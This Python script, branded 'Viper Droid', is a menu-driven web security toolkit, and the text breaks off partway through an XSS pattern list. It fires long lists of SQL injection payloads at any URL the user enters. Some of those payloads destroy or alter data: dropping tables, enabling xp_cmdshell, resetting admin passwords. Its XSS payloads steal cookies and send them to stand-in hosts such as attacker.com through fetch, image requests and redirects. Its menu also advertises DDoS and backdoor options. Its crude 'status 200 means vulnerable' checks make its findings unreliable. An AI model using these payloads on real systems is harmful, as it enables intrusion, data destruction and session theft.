import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import scrapy
from urllib.parse import urljoin
from scrapy import Spider
import queue
import socket
from urllib.parse import urlparse, urljoin
from scrapy.crawler import CrawlerProcess
import re
import time
from collections import deque
from collections import defaultdict
import threading
import urllib.parse
import dns.resolver
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
import os
import subprocess
import multiprocessing
import asyncio
import aiohttp
import random
import string
import psutil
from pywifi import PyWiFi, const, Profile


def powered_by():
    return "Powered by Viper Droid"


print(powered_by())


def banner():
    print("""
     ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
    ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
    ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
    ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
    ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
     ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝
    Powered by Viper Droid
======================================
||       Web Application Security   ||
======================================
1. SQL Injection Detector
2. Cross-Site Scripting (XSS) Detector
3. Web Crawler and Vulnerability Scanner
4. Web Application Firewall (WAF) for Input Validation
5. Rate limiter
6. Get my public ip address
7. Security Headers Check
8. SQL Injection (Advanced)
9. Cross-Site Scripting (XSS) (Advanced)
10. Api Scanning 
11. Malware detection
12. Sub domain finder
13. Brute Force Protection Tester
14. Open Redirect
15. Open Port
16. Show back door exploits
17. Ddos
18. My mac address
19. Scan network
20. Exit
======================================
""")


# SQL Injection Detector
def sql_injection_detector():
    target = input("Enter target URL: ")
    payloads = [
        "' OR '1'='1",  # Tautology-based SQL injection
        "' UNION SELECT 1,2,3--",  # Union-based SQL injection
        "' AND 1=1--",  # Tautology-based SQL injection
        "' OR 'a'='a",  # Tautology-based SQL injection
        "' OR 1=1--",  # Tautology-based SQL injection
        "'; DROP TABLE users--",  # SQL statement to delete table (dangerous)
        "';--",  # Comment out the rest of the query
        "' UNION SELECT NULL, NULL, NULL--",  # Union-based with NULL values
        "' AND 1=2--",  # False condition for blind SQLi
        "' OR 1=1 LIMIT 1--",  # Using LIMIT for filtering in union-based SQLi
        "' AND 1=1 ORDER BY 1--",  # Order-based SQL injection
        "' OR 1=1 GROUP BY 1--",  # Group-by SQL injection
        "'; EXEC xp_cmdshell('dir')--",  # Attempt to execute system commands (SQL Server specific)
        "' OR 1=1 AND user='admin'--",  # Attempting login bypass with specific username
        "' AND SLEEP(5)--",  # Time-based blind SQL injection (MySQL/PostgreSQL)
        "'; WAITFOR DELAY '0:0:5'--",  # Time-based SQLi (SQL Server specific)
        "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1)) = 85--",
        # Substring-based blind SQLi (SQL Server)
        "1' AND 1=1--",  # Simple condition-based injection
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        # Querying information schema tables (information disclosure)
        "' AND (SELECT 1 FROM users WHERE username = 'admin')--",  # SQLi against a specific user
        "' AND 1=1 ORDER BY 100--",  # Testing large number of columns for UNION-based SQLi
        "'; SELECT * FROM mysql.user--",  # Trying to retrieve user data (MySQL)
        "'; SELECT table_name FROM information_schema.tables--",  # List all tables in the database
        "'; SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        # List columns of a specific table
        "' AND 1=1 AND SUBSTRING(@@version,1,1) = 5--",  # Extracting MySQL version (blind SQLi)
        "' AND 1=1 AND LENGTH(@@version) > 4--",  # Length-based SQL injection for version disclosure
        "'; EXEC xp_readerrorlog--",  # Accessing SQL Server error logs (dangerous)
        "' AND 1=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 0--",
        # PostgreSQL schema disclosure
        "'; SELECT username, password FROM users--",  # Attempt to retrieve usernames and passwords
        "' AND EXISTS (SELECT 1 FROM users WHERE username='admin')--",  # Checking existence of user in the database
        "'; UPDATE users SET password='newpassword' WHERE username='admin'--",  # Attempt to update password
        "'; SELECT 1,2,3,4,5 FROM users--",  # Trying to pull multiple columns (for UNION-based injection)
        "' AND 1=1 AND (SELECT user())--",  # MySQL user identification (blind SQLi)
        "' AND 1=1 AND (SELECT password FROM users WHERE username='admin')--",
        # Trying to extract password (blind SQLi)
        "' OR 1=1 AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')--",  # SQL Server table count
        "' OR 1=1 AND (SELECT TOP 1 name FROM sysdatabases)--",  # Extracting database names (SQL Server)
        "' AND 1=1 AND (SELECT 1 FROM pg_catalog.pg_user WHERE usename = 'postgres')--",  # PostgreSQL user check
        "' AND 1=1 AND (SELECT 1 FROM v$version)--",  # Oracle database version disclosure
        "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--",  # Case-based conditional SQL injection
        "' AND 1=1 AND (SELECT NULL FROM information_schema.tables)--",
        # Null-based SQL injection for testing database tables
        "' OR 1=1 AND (SELECT current_database())--",  # PostgreSQL current database disclosure
        "' AND 1=1 AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='public')--",
        # List all table names (MySQL)
        "' AND 1=1 AND (SELECT user FROM mysql.db)--",  # MySQL database user check
        "'; SHOW TABLES--",  # Show all database tables (MySQL)
        "'; SHOW COLUMNS FROM users--",  # Show columns in 'users' table (MySQL)
        "' OR 1=1 AND (SELECT password FROM admin)--",  # Attempt to extract password from 'admin' table
        "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--",
        # Password brute-force using substring (blind SQLi)
        "' AND 1=1 AND (SELECT HEX(password) FROM users WHERE username='admin')--",
        # Getting password in hexadecimal format
        "'; EXEC xp_cmdshell('net user')--",  # Executing command to list users (SQL Server)
        "' AND 1=1 AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",  # Extracting table names in SQL Server
        "'; EXEC sp_configure 'show advanced options', 1--",  # Enabling advanced options in SQL Server
        "'; EXEC sp_configure 'xp_cmdshell', 1--",  # Enabling xp_cmdshell in SQL Server (dangerous)
        "' AND 1=1 AND (SELECT DB_NAME())--",  # Extract current database name (SQL Server)
        "' AND 1=1 AND (SELECT COUNT(*) FROM sysobjects)--",  # Count the number of system objects (SQL Server)
        "' OR 1=1 AND (SELECT schema_name() FROM information_schema.schemata)--",  # Schema name disclosure (PostgreSQL)
        "' AND 1=1 AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')--",
        # List tables in 'public' schema (PostgreSQL)
        "' AND 1=1 AND (SELECT pg_catalog.pg_table_size('users'))--",  # Query table size in PostgreSQL
        "' AND 1=1 AND (SELECT (SELECT COUNT(*) FROM pg_catalog.pg_user) FROM pg_catalog.pg_user)--",
        # PostgreSQL user count disclosure
        "' OR 'x'='x' LIMIT 1,1--",  # Bypass protection by limiting number of rows (MySQL/PostgreSQL)
        "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",  # SQL Server command to drop all tables (destructive)
        "';--",  # Comment out the rest of the query
        "1' UNION ALL SELECT NULL,NULL,NULL--",  # Union-based SQLi with NULLs
        "' AND (SELECT COUNT(*) FROM pg_catalog.pg_stat_activity)--",  # Query running processes in PostgreSQL
        "' OR 1=1 AND (SELECT username FROM users LIMIT 1)--",  # Extract usernames from users table
        "' OR 1=1 AND (SELECT version() FROM pg_catalog.pg_version)--",  # PostgreSQL version disclosure
    ]

    print("Testing for SQL Injection vulnerabilities...")
    for payload in payloads:
        try:
            url = f"{target}?id={payload}"
            response = requests.get(url, timeout=5)  # Added timeout
            if response.status_code == 200 and "error" not in response.text:
                print(f"Potential SQLi vulnerability found with payload: {payload}")
            else:
                print(f"No vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing payload {payload}: {e}")


# Cross-Site Scripting (XSS) Detector
def xss_detector():
    target = input("Enter target URL: ")
    payloads = [
        "<script>alert('XSS')</script>",  # Basic XSS payload
        "<img src='x' onerror='alert(1)'>",  # Basic image XSS with an error event handler
        "<img src='javascript:alert(1)'>",  # JavaScript URI-based XSS
        "<a href='javascript:alert(1)'>Click me</a>",  # JavaScript in a link
        "<script>confirm('XSS')</script>",  # Basic XSS using confirm dialog
        "<div onmouseover='alert(1)'>Hover over me</div>",  # XSS on mouseover event
        "<iframe src='javascript:alert(1)'></iframe>",  # Iframe-based XSS
        "<input type='text' value='<script>alert(1)</script>' />",  # Input field XSS
        "<body onload='alert(1)'>",  # XSS triggered by body onload event
        "<script>window.location='javascript:alert(1)';</script>",  # XSS that changes location
        "<svg/onload=alert(1)>",  # SVG-based XSS
        "<math onmouseover='alert(1)'>Hover me</math>",  # Math XSS
        "<video><source src='javascript:alert(1)'></source></video>",  # XSS via video tag
        "<form action='javascript:alert(1)'><input type='submit' value='Submit'></form>",  # XSS via form submission
        "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">');</script>",  # Dynamic XSS via document.write
        "<script>fetch('http://malicious-site.com/?cookie=' + document.cookie);</script>",
        # XSS with fetch for stealing cookies
        "<script>eval('alert(1)');</script>",  # XSS with eval()
        "<script>new Function('alert(1)')();</script>",  # XSS using Function constructor
        "<a href='javascript:eval(atob(\"YWxlcnQoMSk=\"))'>Click me</a>",  # XSS encoded in Base64
        "<script>document.location='http://malicious-site.com?cookie=' + document.cookie;</script>",
        # Redirecting with cookie stealing
        "<img src='x' onerror='fetch(\\\"http://malicious-site.com?cookie=\" + document.cookie)'>",
        # Cookie stealing via XSS with fetch
        "<object data='javascript:alert(1)'></object>",  # Object-based XSS
        "<svg><script>confirm('XSS')</script></svg>",  # XSS in SVG tag
        "<style>@import url('javascript:alert(1)');</style>",  # XSS in CSS using @import
        "<script>setInterval(function(){alert(1)},1000);</script>",  # Repeated XSS with setInterval
        "<audio onplay='alert(1)'></audio>",  # Audio tag-based XSS
        "<video onplay='alert(1)'></video>",  # Video tag-based XSS
        "<object type='application/x-shockwave-flash' data='javascript:alert(1)'></object>",
        # Flash XSS (deprecated, but still exploitable)
        "<iframe src='javascript:alert(1)' width='0' height='0'></iframe>",  # Invisible iframe XSS
        "<img src='data:image/svg+xml;base64,PHN2ZyBvbk...'>",  # Base64 encoded SVG XSS
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  # Refresh header-based XSS
        "<script>window.open('javascript:alert(1)')</script>",  # XSS using window.open
        "<div style='background:url(javascript:alert(1))'>",  # CSS background XSS
        "<script src='http://malicious-site.com/malicious.js'></script>",  # External script inclusion
        "<a href='javascript:void(0)' onmouseover='alert(1)'>Link</a>",  # XSS using `javascript:void(0)`
        "<input type='text' value='<script>alert(1)</script>' />",  # Input field with script in the value
        "<script>history.pushState('XSS', '', 'javascript:alert(1)');</script>",
        # XSS via pushState (history manipulation)
        "<script>localStorage.setItem('XSS', 'true');</script>",  # Storing XSS in localStorage
        "<script>sessionStorage.setItem('XSS', 'true');</script>",  # Storing XSS in sessionStorage
        "<script>document.body.appendChild(document.createElement('iframe')).src='javascript:alert(1)';</script>",
        # Dynamic iframe injection
        "<img src='x' onerror='alert(document.cookie)'>",  # Cookie leakage with XSS
        "<object type='application/x-shockwave-flash' data='http://malicious-site.com/malicious.swf'></object>",
        # Flash XSS with external payload
        "<script>window.top.location='http://attacker.com?cookie=' + document.cookie</script>",
        # XSS that steals cookies from top frame
        "<a href='javascript:document.write('<img src=\'http://attacker.com?cookie=' + document.cookie + '\'>')'>Click me</a>",
        # Cookie stealing via document.write
        "<script>var img = new Image(); img.src = 'http://attacker.com/log?cookie=' + document.cookie;</script>",
        # Image-based cookie theft
        "<script>document.cookie = 'XSS=true';</script>",  # Setting malicious cookies
        "<script>document.location.href = 'http://malicious.com/?cookie=' + document.cookie;</script>",
        # Cookie theft using redirect
        "<script>setTimeout(function(){ alert(1); }, 100);</script>",  # Delayed alert XSS
        "<script>document.body.innerHTML = '<img src=\"x\" onerror=\"alert(1)\">';</script>",
        # Injecting script via innerHTML
        "<svg><animate attributeName='x' from='0' to='1' dur='1s' repeatCount='indefinite' onbegin='alert(1)'></animate></svg>",
        # SVG animation-based XSS
        "<script>document.getElementById('element').setAttribute('onclick', 'alert(1)');</script>",
        # Dynamic XSS using DOM manipulation
        "<div onclick='alert(1)'>Click me</div>",  # Simple clickable XSS using a div
        "<input type='text' onfocus='alert(1)'>",  # XSS on input focus
        "<script>document.write('<img src=\\\"data:image/svg+xml;base64,PHN2ZyBvbk...\\\">');</script>",
        # SVG-based dynamic injection
        "<script>var x = new XMLHttpRequest(); x.open('GET', 'http://attacker.com', true); x.send();</script>",
        # XSS with AJAX request
        "<button onclick='alert(1)'>Click me</button>",  # Button-based XSS
        "<form action='#' method='get'><input type='text' value='<script>alert(1)</script>' name='username'></form>",
        # XSS in form field
        "<script>document.cookie = 'XSS=true; path=/';</script>",  # Setting cookies through XSS
        "<script>fetch('http://malicious-site.com?cookie=' + btoa(document.cookie));</script>",
        # Base64 encoding cookies before sending
        "<script>setTimeout(function(){ alert('XSS!'); }, 10000);</script>",  # Delayed XSS with timeout
        "<script>window.history.replaceState({}, '', 'javascript:alert(1)');</script>",
        # Replace URL with JavaScript payload
        "<script>document.createElement('img').src = 'http://malicious.com/log?cookie=' + document.cookie;</script>",
        # Logging cookies using image request
        "<iframe src='javascript:alert(document.cookie);'></iframe>",  # Cookie theft using iframe
        "<iframe src='javascript:eval(atob(\"YWxlcnQoJ0ludmFsaWQnKSI=\\\"))'></iframe>",
        # Base64-decoded payload in iframe
    ]

    print("Testing for XSS vulnerabilities...")
    for payload in payloads:
        response = requests.get(target, params={"input": payload})
        if payload in response.text:
            print(f"Potential XSS vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")


# Web Crawler for Vulnerability Scanning
class WebCrawler(scrapy.Spider):
    name = "web_crawler"

    def __init__(self, start_url):
        self.start_urls = [start_url]

    def parse(self, response):
        # Extract all links on the webpage
        links = response.css('a::attr(href)').getall()
        for link in links:
            link = urljoin(response.url, link)
            parsed_link = urlparse(link)
            if parsed_link.scheme in ["http", "https"]:
                print(f"Discovered endpoint: {link}")
                yield response.follow(link, self.parse)
            else:
                print(f"Skipping invalid link: {link}")

        # Analyze security headers
        print("\nSecurity Headers Analysis:")
        headers = response.headers
        required_headers = [
            'Strict-Transport-Security',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'Content-Security-Policy',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Permissions-Policy',
            'Cache-Control',
            'Expect-CT',
            'Access-Control-Allow-Origin',
            'X-Permitted-Cross-Domain-Policies',
            'X-Content-Security-Policy',
            'Feature-Policy',
            'Public-Key-Pins',
            'Cross-Origin-Resource-Policy',
            'Cross-Origin-Opener-Policy',
            'Cross-Origin-Embedder-Policy',
            'X-Download-Options',
            'Surrogate-Capability',
            'Strict-Transport-Security',
            'X-Webkit-CSP',
            'X-Powered-By',  # Often used in HTTP headers, exposing technology stack. Should be removed for security.
            'Pragma',  # Can be used to disable caching.
            'DNT',  # Do Not Track, preventing tracking of users.
            'Upgrade-Insecure-Requests',  # Informs the browser to upgrade HTTP requests to HTTPS.
            'Content-Type',  # Ensures proper content type is sent.
            'Content-Disposition'  # Used to control file download handling.
        ]
        for header, value in headers.items():
            print(f"{header.decode()}: {value.decode()}")

        for header in required_headers:
            if header not in headers:
                print(f"Missing important security header: {header}")


# Web Application Firewall (WAF) for Input Validation
def sanitize_input(user_input):
    # Define patterns for potential XSS and SQL Injection
    xss_pattern = re.compile(r'<.*?>')  # Detects HTML tags
    sql_injection_pattern = re.compile(r'(\bDROP\b|\bSELECT\b|\bUNION\b|\b--|\b;|--|/*)', re.IGNORECASE)

    if xss_pattern.search(user_input):
        print("Error: Possible XSS detected.")
        return None
    elif sql_injection_pattern.search(user_input):
        print("Error: Possible SQL injection detected.")
        return None
    else:
        # Input is safe to use
        return user_input


# Rate Limiter class
class RateLimiter:
    def __init__(self, max_requests=5, time_window=60):
        # Ensure these parameters are properly defined
        self.max_requests = max_requests  # Max requests allowed within the time window
        self.time_window = time_window  # Time window in seconds
        self.requests = defaultdict(list)  # Track requests per IP address
        self.lock = threading.Lock()  # Lock to ensure thread safety

    def is_allowed(self, ip_address):
        current_time = time.time()

        with self.lock:
            # Remove old requests that are outside the time window
            self.requests[ip_address] = [timestamp for timestamp in self.requests[ip_address] if
                                         current_time - timestamp < self.time_window]

            # Check if the IP address has exceeded the rate limit
            if len(self.requests[ip_address]) < self.max_requests:
                # Allow the request and log the timestamp
                self.requests[ip_address].append(current_time)
                return True
            else:
                return False

    def get_request_count(self, ip_address):
        """Returns the number of requests made by the IP in the last time window"""
        current_time = time.time()
        with self.lock:
            self.requests[ip_address] = [timestamp for timestamp in self.requests[ip_address] if
                                         current_time - timestamp < self.time_window]
            return len(self.requests[ip_address])

    def reset(self):
        """Reset the rate limiter (e.g., in case of a time-based reset or manual reset)"""
        with self.lock:
            self.requests.clear()

    def set_rate_limit(self, max_requests, time_window):
        """Allows dynamic adjustment of rate limits"""
        self.max_requests = max_requests
        self.time_window = time_window
        self.reset()  # Reset to ensure new limits take effect immediately


# Function to get public IP address
def get_public_ip():
    try:
        # Using ipify API to get public IP address
        response = requests.get("https://api.ipify.org")
        if response.status_code == 200:
            return response.text
        else:
            print("Failed to retrieve IP address.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None


# Function to check if a specific security header exists
def check_header(headers, header_name):
    return header_name in headers


# Function to check and analyze CSP headers
def check_csp(csp_header):
    # You can extend this logic to check for more complex CSP rules
    if "default-src" not in csp_header:
        return "⚠️ No default-src directive found in CSP"
    else:
        return "✔ CSP is configured"


# Function to check all common security headers
def check_security_headers(url):
    print(f"Checking security headers for: {url}")

    try:
        response = requests.get(url, timeout=10)  # Added timeout for safety

        if response.status_code == 200:
            print("\nSecurity headers found in the response:")

            # List of important headers to check
            headers_to_check = {
                "Strict-Transport-Security": "HSTS",
                "Content-Security-Policy": "CSP",
                "X-Content-Type-Options": "X-Content-Type-Options",
                "X-Frame-Options": "X-Frame-Options",
                "X-XSS-Protection": "X-XSS-Protection",
                "Referrer-Policy": "Referrer-Policy",
                "Permissions-Policy": "Feature-Policy",
                "Cache-Control": "Cache-Control",
                "Expect-CT": "Expect-CT",
                "Access-Control-Allow-Origin": "CORS",
                # Additional headers
                "Strict-Transport-Security": "HSTS",
                "X-Permitted-Cross-Domain-Policies": "Cross-Domain Policies",
                "X-Content-Security-Policy": "X-CSP",
                "X-Webkit-CSP": "X-Webkit-CSP",
                "Feature-Policy": "Feature-Policy",
                "Public-Key-Pins": "HPKP",
                "Content-Type": "Content-Type",
                "Cross-Origin-Resource-Policy": "CORP",
                "Cross-Origin-Opener-Policy": "COOP",
                "Cross-Origin-Embedder-Policy": "COEP",
                "Referrer-Policy": "Referrer-Policy",
                "Surrogate-Capability": "Surrogate-Capability",
                "X-Download-Options": "X-Download-Options",
                "X-Content-Security-Policy": "X-CSP"
            }

            for header, name in headers_to_check.items():
                if check_header(response.headers, header):
                    if header == "Content-Security-Policy":
                        print(f"✔ {name} header present: {check_csp(response.headers[header])}")
                    else:
                        print(f"✔ {name} header present: {response.headers[header]}")
                else:
                    print(f"✘ {name} header missing!")

            # Check for allowed HTTP methods
            allowed_methods = response.headers.get("Allow", "Not specified")
            print(f"\nAllowed HTTP methods: {allowed_methods}")

            # Check for HTTP version (1.1 or 2)
            http_version = response.raw.version
            if http_version == 10:
                print("✘ HTTP/1.0 detected - Consider upgrading to HTTP/1.1 or HTTP/2")
            elif http_version == 11:
                print("✔ HTTP/1.1 detected")
            elif http_version == 20:
                print("✔ HTTP/2 detected")

            # Check for cookies
            cookies = response.cookies
            if cookies:
                print("\nCookies found in response:")
                for cookie in cookies:
                    print(f"- {cookie.name}: {cookie.value}")
                    if cookie.secure:
                        print(f"  - Secure flag is set.")
                    if hasattr(cookie, 'has_non_standard_attr') and cookie.has_non_standard_attr('HttpOnly'):
                        print(f"  - HttpOnly flag is set.")
                    if cookie.sameSite:
                        print(f"  - SameSite flag is set to {cookie.sameSite}")
            else:
                print("No cookies found.")

        else:
            print(f"Error: {response.status_code} - Unable to fetch the URL")

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


# Sql injection advanced
class SQLInjectionDetector:
    def __init__(self):
        self.sql_injection_patterns = [
            # Common SQL keywords for tautology-based injections
            r"(\bunion\b|\bselect\b|\binsert\b|\bupdate\b|\bdelete\b|\bdrop\b|\bexec\b|\bdeclare\b|\bselect\b|\bfrom\b|\bwhere\b|\blike\b|\bwaitfor\b|\bbenchmark\b|\bcast\b|\bchar\b|\bconcat\b|\bconvert\b)",
            # Special characters used in SQL injections
            r"(['\";=()&|*%])",
            # SQL comments for hiding injection code
            r"(--|#|/\*|\*/)",
            # SQL boolean-based blind injections
            r"(\bOR\b.*\b1=1\b|\bAND\b.*\b1=1\b)",
            # Time-based blind injection payloads
            r"(sleep\(\d+\)|benchmark\(\d+,\d+\))",
            # URL encoded SQL injection payloads
            r"(%27|%22|\bunion\b|\bselect\b|\bfrom\b|\bwhere\b|\bdrop\b|\bexec\b|\bcast\b|\binsert\b|\bupdate\b)",
            # Comments to hide SQL injections
            r"(/\*|\*/|--|#)",
            # SQL injection payloads targeting stored procedures or functions
            r"(\bEXEC\b|\bsp_executesql\b|\bcall\b|\bprepare\b|\bexecute\b)",
            # Input containing SQL reserved keywords in multiple forms
            r"(\bselect\b.*\bfrom\b.*\bwhere\b|\bselect\b.*\bcount\b|\bselect\b.*\bcolumn_name\b|\bselect\b.*\btable_name\b)",
            # Nested SQL queries
            r"(\bselect\b.*\bselect\b|\bselect\b.*\bfrom\b.*\bselect\b)",
            # SQL injection using numeric values (for example, exploiting integer columns)
            r"(\bselect\b.*\bfrom\b.*\bwhere\b.*\d+|\bselect\b.*\bfrom\b.*\bgroup\b.*\bby\b.*\d+)",
            # Common SQL injection symbols like double or single quotes
            r"(\b'|\b\")",
            # SQL injection using comments to bypass certain filters
            r"(--|\*/|#)",
            # SQL injection through conditional statements or case statements
            r"(\bcase\b|\bwhen\b|\bthen\b|\belse\b|\bend\b)",
            # Bypassing filters using hex encoding
            r"(\b0x[0-9a-fA-F]+)"
        ]
        self.user_input_patterns = re.compile("|".join(self.sql_injection_patterns), re.IGNORECASE)

    def is_sql_injection(self, input_data):
        """
        Check if the input data matches any SQL injection pattern.
        """
        if self.user_input_patterns.search(input_data):
            return True
        return False

    def test_sql_injection(self, url, param_name):
        """
        Test for SQL Injection vulnerabilities in a given URL with a specific parameter.
        """
        payloads = [
            "' OR '1'='1",  # Tautology-based SQL injection
            "' UNION SELECT 1,2,3--",  # Union-based SQL injection
            "' AND 1=1--",  # Tautology-based SQL injection
            "' OR 'a'='a",  # Tautology-based SQL injection
            "' OR 1=1--",  # Tautology-based SQL injection
            "'; DROP TABLE users--",  # SQL statement to delete table (dangerous)
            "';--",  # Comment out the rest of the query
            "' UNION SELECT NULL, NULL, NULL--",  # Union-based with NULL values
            "' AND 1=2--",  # False condition for blind SQLi
            "' OR 1=1 LIMIT 1--",  # Using LIMIT for filtering in union-based SQLi
            "' AND 1=1 ORDER BY 1--",  # Order-based SQL injection
            "' OR 1=1 GROUP BY 1--",  # Group-by SQL injection
            "'; EXEC xp_cmdshell('dir')--",  # Attempt to execute system commands (SQL Server specific)
            "' OR 1=1 AND user='admin'--",  # Attempting login bypass with specific username
            "' AND SLEEP(5)--",  # Time-based blind SQL injection (MySQL/PostgreSQL)
            "'; WAITFOR DELAY '0:0:5'--",  # Time-based SQLi (SQL Server specific)
            "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1)) = 85--",
            # Substring-based blind SQLi (SQL Server)
            "1' AND 1=1--",  # Simple condition-based injection
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            # Querying information schema tables (information disclosure)
            "' AND (SELECT 1 FROM users WHERE username = 'admin')--",  # SQLi against a specific user
            "' AND 1=1 ORDER BY 100--",  # Testing large number of columns for UNION-based SQLi
            "'; SELECT * FROM mysql.user--",  # Trying to retrieve user data (MySQL)
            "'; SELECT table_name FROM information_schema.tables--",  # List all tables in the database
            "'; SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
            # List columns of a specific table
            "' AND 1=1 AND SUBSTRING(@@version,1,1) = 5--",  # Extracting MySQL version (blind SQLi)
            "' AND 1=1 AND LENGTH(@@version) > 4--",  # Length-based SQL injection for version disclosure
            "'; EXEC xp_readerrorlog--",  # Accessing SQL Server error logs (dangerous)
            "' AND 1=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 0--",
            # PostgreSQL schema disclosure
            "'; SELECT username, password FROM users--",  # Attempt to retrieve usernames and passwords
            "' AND EXISTS (SELECT 1 FROM users WHERE username='admin')--",  # Checking existence of user in the database
            "'; UPDATE users SET password='newpassword' WHERE username='admin'--",  # Attempt to update password
            "'; SELECT 1,2,3,4,5 FROM users--",  # Trying to pull multiple columns (for UNION-based injection)
            "' AND 1=1 AND (SELECT user())--",  # MySQL user identification (blind SQLi)
            "' AND 1=1 AND (SELECT password FROM users WHERE username='admin')--",
            # Trying to extract password (blind SQLi)
            "' OR 1=1 AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')--",  # SQL Server table count
            "' OR 1=1 AND (SELECT TOP 1 name FROM sysdatabases)--",  # Extracting database names (SQL Server)
            "' AND 1=1 AND (SELECT 1 FROM pg_catalog.pg_user WHERE usename = 'postgres')--",  # PostgreSQL user check
            "' AND 1=1 AND (SELECT 1 FROM v$version)--",  # Oracle database version disclosure
            "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--",  # Case-based conditional SQL injection
            "' AND 1=1 AND (SELECT NULL FROM information_schema.tables)--",
            # Null-based SQL injection for testing database tables
            "' OR 1=1 AND (SELECT current_database())--",  # PostgreSQL current database disclosure
            "' AND 1=1 AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='public')--",
            # List all table names (MySQL)
            "' AND 1=1 AND (SELECT user FROM mysql.db)--",  # MySQL database user check
            "'; SHOW TABLES--",  # Show all database tables (MySQL)
            "'; SHOW COLUMNS FROM users--",  # Show columns in 'users' table (MySQL)
            "' OR 1=1 AND (SELECT password FROM admin)--",  # Attempt to extract password from 'admin' table
            "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'--",
            # Password brute-force using substring (blind SQLi)
            "' AND 1=1 AND (SELECT HEX(password) FROM users WHERE username='admin')--",
            # Getting password in hexadecimal format
            "'; EXEC xp_cmdshell('net user')--",  # Executing command to list users (SQL Server)
            "' AND 1=1 AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
            # Extracting table names in SQL Server
            "'; EXEC sp_configure 'show advanced options', 1--",  # Enabling advanced options in SQL Server
            "'; EXEC sp_configure 'xp_cmdshell', 1--",  # Enabling xp_cmdshell in SQL Server (dangerous)
            "' AND 1=1 AND (SELECT DB_NAME())--",  # Extract current database name (SQL Server)
            "' AND 1=1 AND (SELECT COUNT(*) FROM sysobjects)--",  # Count the number of system objects (SQL Server)
            "' OR 1=1 AND (SELECT schema_name() FROM information_schema.schemata)--",
            # Schema name disclosure (PostgreSQL)
            "' AND 1=1 AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')--",
            # List tables in 'public' schema (PostgreSQL)
            "' AND 1=1 AND (SELECT pg_catalog.pg_table_size('users'))--",  # Query table size in PostgreSQL
            "' AND 1=1 AND (SELECT (SELECT COUNT(*) FROM pg_catalog.pg_user) FROM pg_catalog.pg_user)--",
            # PostgreSQL user count disclosure
            "' OR 'x'='x' LIMIT 1,1--",  # Bypass protection by limiting number of rows (MySQL/PostgreSQL)
            "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",  # SQL Server command to drop all tables (destructive)
            "';--",  # Comment out the rest of the query
            "1' UNION ALL SELECT NULL,NULL,NULL--",  # Union-based SQLi with NULLs
            "' AND (SELECT COUNT(*) FROM pg_catalog.pg_stat_activity)--",  # Query running processes in PostgreSQL
            "' OR 1=1 AND (SELECT username FROM users LIMIT 1)--",  # Extract usernames from users table
            "' OR 1=1 AND (SELECT version() FROM pg_catalog.pg_version)--",  # PostgreSQL version disclosure
        ]

        for payload in payloads:
            print(f"Testing payload: {payload}")
            # URL encode the payload if needed
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param_name}={encoded_payload}"

            try:
                response = requests.get(test_url)
                if response.status_code == 200:
                    print(f"Potential SQL injection detected with payload: {payload}")
                else:
                    print(f"No vulnerability detected with payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Error while testing the payload: {e}")


# XSS Detector Class advanced
class XSSDetector:
    def __init__(self):
        # Define common XSS patterns for detection
        self.xss_patterns = [
            r"<script.*?>.*?</script>",  # Script tags
            r"<.*?on[a-z]+=.*?>",  # Event handlers like onload, onclick, etc.
            r"<.*?javascript:.*?>",  # Inline JavaScript links
            r"<.*?eval\(.*?\)>",  # Eval function calls
            r"<.*?document.*?write\(.*?\)>",  # Document.write() calls
            r"<.*?alert\(.*?\)>",  # Alert popups
            r"<.*?confirm\(.*?\)>",  # Confirm popups
            r"<.*?prompt\(.*?\)>",  # Prompt popups
            r"<.*?setInterval\(.*?\)>",  # setInterval calls
            r"<.*?setTimeout\(.*?\)>",  # setTimeout calls
            r"<.*?window\.location.*?>",  # Location manipulation
            r"<.*?window\.open.*?>",  # Window opening with malicious content
            r"<.*?eval\(.*?eval\(.*?\)\)>",  # Nested eval function
            r"<.*?src=.*?data:.*?>",  # Data URL injections
            r"<.*?src=.*?vbscript:.*?>",  # VBScript injections
            r"<.*?src=.*?file:.*?>",  # File-based URL injections
